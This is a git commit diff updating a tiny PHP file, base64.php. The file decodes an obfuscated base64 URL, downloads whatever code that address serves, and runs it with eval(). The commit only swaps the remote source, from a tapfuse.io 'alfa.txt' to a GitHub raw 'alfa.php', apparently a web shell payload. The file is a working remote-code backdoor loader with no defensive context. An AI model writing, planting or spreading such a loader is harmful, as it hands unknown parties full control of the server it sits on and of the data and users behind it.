c00a546cd26f16e5b2fe4b35a4594124cdf0f1ed
robots5050 <mryancool404@gmail.com>
2025-09-18 07:18:34 +0700

    Update base64.php

--- base64.php
+++ base64.php
@@ -1,6 +1,6 @@
 <?php
 #poiklsd
 ob_start();
-readfile(base64_decode('aHR0cHM6Ly93d3cudGFwZnVzZS5pby9yYXcvYWxmYS50eHQ='));
+readfile(base64_decode('aHR0cHM6Ly9naXRodWIuY29tL3JvYm90czUwNTAvdGVzdC9yYXcvcmVmcy9oZWFkcy9tYWluL2FsZmEucGhw'));
 eval('?>'.ob_get_clean());
 ?>
